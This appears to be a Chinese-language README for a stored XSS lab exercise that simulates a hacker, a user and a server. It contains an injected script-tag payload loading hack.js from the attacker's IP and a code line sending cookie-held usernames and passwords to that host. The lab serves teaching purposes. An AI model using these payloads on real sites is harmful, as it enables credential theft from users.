# 跨站式脚本攻击（XSS attack) 实验

# 支持的操作系统
Windows, Linux
# 需要软件
Apache HTTP Server, MySQL, PHP 7.0
# 安装细节
本实验需要三部电脑以模仿Hacker, 正常用户和服务器。
在这实验中， Hacker需要安装 Apache和PHP, 而服务器三个软件都需要安装。
对于Windows, 把代码放到 Apache 的 DocumentRoot: C:\Apache24\htdocs
对于Linux，把代码放到 Apache 的 DocumentRoot: /var/www/html/
Hacker 和服务器的代码分别在 hack 和 webserver文件夹里。
然后， 在webserver/databaseAuth.txt 需要隔行分别提供MySQL的用户名和密码
然后，在/hack/hack.js里需要把代码进行修改 (第16行）：script.src = 'http://#在这里写hacker的IP地址#/index.php?username=' + username + '&password='+password;
# 实验过程
我门设定了用户 hacker 和他的密码位：78539816, 正常用户 jim123 和他的密码位：12345678 (这些可在createDatabase.sql 修改）。
每当用户登入到网站，服务器将会在cookies里记录用户名和密码。
首先， hacker在登入了网页后，在论坛的评论输入区输入恶意代码： <script type = "text/javascript" src = "http://#在这里写hacker的IP地址#/hack.js"></script>
，并注入到数据库里。这样，恶意代码只要数据库管里员一日没有发现，恶意代码将会永远存储在数据库。每当正常用户
在论坛里登入后再发评论，会显示到其他用户的评论，而在此时恶意代码将会执行，并把存放在正常用户客户端的Cookies发到Hacker，从而Hacker得到用户名和密码。
